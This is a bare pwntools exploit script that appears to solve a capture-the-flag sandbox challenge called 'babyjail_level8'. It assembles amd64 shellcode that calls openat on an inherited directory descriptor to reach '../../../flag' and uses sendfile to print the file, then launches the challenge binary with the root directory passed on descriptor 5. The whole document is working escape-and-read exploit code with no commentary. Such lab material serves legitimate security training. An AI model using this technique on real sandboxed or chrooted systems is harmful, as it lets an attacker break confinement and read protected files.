from pwn import *
import os
context.arch='amd64'

payload = asm(
'''
    mov rax, 257
    mov rdi, 5
    mov r10, 0
    mov rdx, 0
    lea rsi, [rip+f]
    syscall

    mov rsi, rax
    mov rdi, 1
    mov rdx, 0
    mov r10, 100
    mov rax, 40
    syscall



    f:
    .string "../../../flag"
    
'''
)
p = open('/tmp/213','wb')
p.write(payload)
p.close()
##https://www.gnu.org/software/bash/manual/html_node/Redirections.html 3.6.1
os.system('/challenge/babyjail_level8 <213  5</')
